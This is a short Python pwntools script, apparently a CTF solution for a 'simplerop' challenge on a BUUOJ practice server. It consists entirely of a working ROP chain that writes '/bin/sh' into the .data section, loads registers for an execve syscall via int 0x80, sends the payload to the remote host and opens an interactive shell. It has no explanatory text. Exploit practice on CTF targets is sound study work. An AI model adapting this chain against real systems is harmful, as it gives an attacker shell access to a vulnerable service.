# method one

from pwn import *


# pro = process("./simplerop")
pro = remote("node4.buuoj.cn", 26489)

# ropchain
from struct import pack

# Padding goes here
p = cyclic(0x14+0x4*3)

# write "/bin/sh\x00" --> 0x080ea060
p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bae06) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bae06) # pop eax ; ret
p += b'/sh\x00'
p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret

# edx = 0, ecx = 0 
# ebx = "/bin/sh\x00"
p += pack('<I', 0x0806e850) # pop edx ; pop ecx ; pop ebx ; ret
p += pack('<I', 0x0)        # 0x0
p += pack('<I', 0x0)        # 0x0
p += pack('<I', 0x080ea060) # @ .data

# eax = 0xb
p += pack('<I', 0x080bae06) # pop eax ; ret
p += pack('<I', 0xb)        # 0xb
p += pack('<I', 0x080493e1) # int 0x80

print("len: ", len(p))
pro.send(p)

pro.interactive()


